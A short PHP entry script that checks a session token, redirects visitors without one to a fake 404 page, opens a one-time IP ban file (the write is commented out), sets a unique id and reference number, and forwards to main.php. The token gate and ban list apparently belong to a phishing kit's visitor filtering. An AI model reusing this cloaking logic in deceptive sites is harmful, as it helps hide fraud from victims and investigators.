<?php

session_start();
require_once 'admin/inc/config.php';
require_once 'admin/inc/functions.php';
require_once 'admin/inc/userInfo.php';

if (strpos(UserInfo::get_ip(), ",") !== false) {
    $rawIP = explode(",", UserInfo::get_ip());
    $ip = $rawIP[0];
} else {
    $ip = UserInfo::get_ip();
}

if (!isset($_SESSION['token'])) {
	header('Location: 404.php');
	exit();
}

$ban_ip = fopen('../onetime.txt', 'a');
//fwrite($ban_ip, $ip . "\n");
fclose($ban_ip);

if (!isset($_SESSION['uniqueid'])) {
  $bytes = random_bytes(20);
  $_SESSION['uniqueid'] = bin2hex($bytes);
}
$_SESSION['referenceno'] = rand(1234567, 9999999);

header('Location: main.php');
exit;
?>
